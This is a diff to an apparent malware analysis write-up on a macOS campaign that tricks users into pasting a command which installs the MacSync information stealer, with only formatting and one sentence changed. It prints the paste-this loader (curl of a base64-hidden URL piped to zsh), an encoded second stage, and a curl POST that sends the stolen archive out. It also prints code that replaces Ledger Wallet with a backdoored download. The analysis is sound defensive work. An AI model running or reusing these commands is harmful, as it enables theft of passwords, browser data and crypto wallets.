@@ -12,7 +12,7 @@ Domain: hxxps[://]macfilearchive[.]com/s3/
 
 This legitimate looking domain instructs users to copy and paste the command in the code block. At first glance, it seems harmless as it is referencing Apple's legitimate domain, but the full command is as follows:
 
-```
+```zsh
 echo "Apple-Installer: https://apps.apple.com/hidenn-gift.application/macOsAppleApicationSetup421415.dmg" && curl -kfsSL $(echo 'aHR0cDovL2JhbGxmcmFuay50b2RheS9jdXJsLzI3MDY1M2Y4NjJmMGVlMjFkY2UwYTQ2ZTQ4MDFlYzI4ZGI0ZGRjNzdiNmZiYTkzNDFiMWI4ZGIyOTkwOWM1MTQ='|base64 -D)|zsh
 ```
 
@@ -24,7 +24,7 @@ hxxp[://]ballfrank[.]today/curl/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba934
 
 I'll instead download the contents of this file without executing it, which results in:
 
-```
+```zsh
 #!/bin/zsh
 d23727=$(base64 -D <<'PAYLOAD_m317823069430411' | gunzip
 H4sIAK23RWkAA+VUXW/TMBR976+4eNW0SSSx89l2lG1CgqFRDWlDTAJUOfZ1a9VxosSFbsB/J3RV
@@ -44,7 +44,7 @@ eval "$d23727"
 
 The Base64 body can be transformed from base64 and gunzipped to reveal:
 
-```
+```zsh
 #!/bin/zsh
 daemon_function() {
     exec </dev/null
@@ -85,7 +85,7 @@ fi
 
 Execution results in the following MacSync information stealer payload:
 
-```
+```applescript
 on filesizer(paths)
 	set fsz to 0
 	try
@@ -710,15 +710,15 @@ Upon execution, the script prompts the user the enter their password, and will r
 
 <img width="429" height="186" alt="image" src="https://github.com/user-attachments/assets/50026e35-301f-4b95-b21e-e97e910a78b6" />
 
-```
+```applescript
 set password_entered to getpwd(username, writemind, "")
 ```
 
-The malware the proceeds to create lists for Chronium based browsers and common crypto-currency wallet related applications / extensions. System information is collected including the Users IP which is actually hardcoded in the initial script as it's populated from when the script is Curled.
+The malware enumerates Chromium-based browsers and a set of cryptocurrency wallet applications/extensions for exfiltration. System information is collected including the Users IP which is actually hardcoded in the initial script as it's populated from when the script is Curled.
 
 The information is initially collected and stored in the direct /tmp/[RANDOM-NUMBER]
 
-```
+```applescript
 set randomNumber to do shell script "echo $((RANDOM % 9000000 + 1000000))"
 set writemind to "/tmp/sync" & randomNumber & "/"
 ```
@@ -733,7 +733,7 @@ A fake compatibility error prompt is then shown to the victim:
 
 The zip archive containing all of the users sensitive information is then exfiltrated via a POST request to ballfrank[.]today, as was shown in the previous script:
 
-```
+```zsh
 curl -k -X POST \
      -H "User-Agent: Mozilla/5.0 ..." \
      -H "api-key: $api_key" \
@@ -752,7 +752,7 @@ The script checks for the presence of '/Applications/Ledger Wallet.app'
 
 If this application exists on the host, it is replaced with a backdoored version downloaded from the malicious domain:
 
-```
+```applescript
 set TREZORURL to "hxxps[://]ballfrank[.]today/trezor/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514"
 set TREZORDMGPATH to "/tmp/270653f862f0ee21dce0a46e4801ec28db4ddc77b6fba9341b1b8db29909c514.zip"
 set TREZORMOUNT to "/tmp"
